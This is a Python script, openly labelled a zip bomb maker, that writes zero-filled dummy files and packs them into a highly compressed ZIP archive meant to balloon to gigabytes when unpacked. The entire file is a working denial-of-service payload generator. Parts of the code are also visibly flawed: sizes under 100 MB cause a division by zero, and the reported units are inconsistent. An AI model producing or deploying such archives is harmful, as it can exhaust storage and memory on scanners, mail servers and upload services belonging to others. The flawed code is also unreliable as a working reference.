# This is a really old and really bad zip_bomb maker
# EX: zipbomb.py file_size out_file
# Flat Zip Reference: https://github.com/damianrusinek/zip-bomb/blob/master/zip-bomb.py
# TODO: Make help string

import zipfile
import shutil
import os
import sys
import time


class Globals:
  size_in_mb: int | None = None  # Argument 1
  out_file: str | None = None    # Argument 2
  dummy_name: str = 'dummy.txt'


class Helper:

  def arg_handler() -> None:
    try:
      if __file__.endswith('.py'):
        arg1: str = sys.argv[1]          # Size of the zip bomb in megabytes
        arg2: str = sys.argv[2].lower()  # Output file path / name
      if __file__.endswith('.exe'):
        arg1: str = sys.argv[1]          # Size of the zip bomb in megabytes
        arg2: str = sys.argv[2].lower()  # Output file path / name
    except Exception:
      pass

    try:
      if arg1.isdigit():  # Arg 1
        Globals.size_in_mb: int = int(arg1)
      else:
        Globals.size_in_mb: int = 5

      if os.path.exists(arg2):  # Arg 2
        print(f'Given output file: "{arg2}" already exists, \
          \ninstead the output file will be "zipbomb.zip".')
        Globals.out_file: str = 'zipbomb.zip'
      else:
        Globals.out_file: str = arg2.replace('.zip', '') + '.zip'

    except IndexError:
      print(f'No arguments given, please pass an argument like "help".')
      sys.exit(1)  # No argument = quit program
    except UnboundLocalError:
      print(
        f'You seem to be missing a required argument, use "help" for more context.'
      )
      sys.exit(1)  # No argument = quit program
    except Exception as e:
      print(f'Unknown exception occurred: \n{e}\n')
      sys.exit(1)  # Runtime error

  @staticmethod
  def generate_dummy_file(filename, size):
    with open(filename, 'w') as dummy:
      dummy.write('0' * (size * 1024 * 1024))

  @staticmethod
  def get_file_size(filename) -> int:
    return os.path.getsize(filename)


class Zip:

  @staticmethod
  def make_copies_and_compress(zf, infile, n_copies):
    for i in range(n_copies):
      extension = infile[infile.rfind('.') + 1:]
      basename = infile[:infile.rfind('.')]
      f_name = f'{basename}-{i}.{extension}'
      shutil.copy(infile, f_name)
      zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
      os.remove(f_name)

  @staticmethod
  def add_file_to_zip(zf, path, include_dir=True):
    if os.path.isfile(path):
      zf.write(path, compress_type=zipfile.ZIP_DEFLATED)
    elif os.path.isdir(path):
      for root, dirs, files in os.walk(path):
        arc_root = root
        if not include_dir:
          arc_root = root[len(path):]
          arc_root = arc_root[1:] if arc_root.startswith(os.sep) else arc_root
        for file in files:
          zf.write(
            os.path.join(root, file), arcname=os.path.join(arc_root, file)
          )

  def create_zipbomb():
    dummy_name_format = 'dummy{}.txt'
    size = Globals.size_in_mb
    files_nb = int(size / 100)
    file_size = int(size / files_nb)
    last_file_size = size - (file_size * files_nb)

    if os.path.isfile(Globals.out_file):
      os.remove(Globals.out_file)

    zf = zipfile.ZipFile(Globals.out_file, mode='w', allowZip64=True)

    if files_nb > 0:
      for i in range(files_nb):
        dummy_name = dummy_name_format.format(i)
        if i == 0:
          Helper.generate_dummy_file(dummy_name, file_size)
        else:
          os.rename(dummy_name_format.format(i - 1), dummy_name)
        zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
      os.remove(dummy_name)

    if last_file_size > 0:
      dummy_name = dummy_name_format.format(files_nb)
      Helper.generate_dummy_file(dummy_name, last_file_size)
      zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
      os.remove(dummy_name)
    zf.close()
    return files_nb * file_size


if __name__ == '__main__':
  Helper.arg_handler()
  start_time = time.time()
  decompressed_size = round(Zip.create_zipbomb() / 1024, 2)
  end_time = time.time()
  compressed_size = round(os.path.getsize(Globals.out_file) / 1000, 2)
  gen_time = round(end_time - start_time, 2)

  print(f'Compressed File Size: {compressed_size} KB')
  print(f'Size After Decompression: ~{decompressed_size} GB')
  print(f'Generation Time: {gen_time} secs')
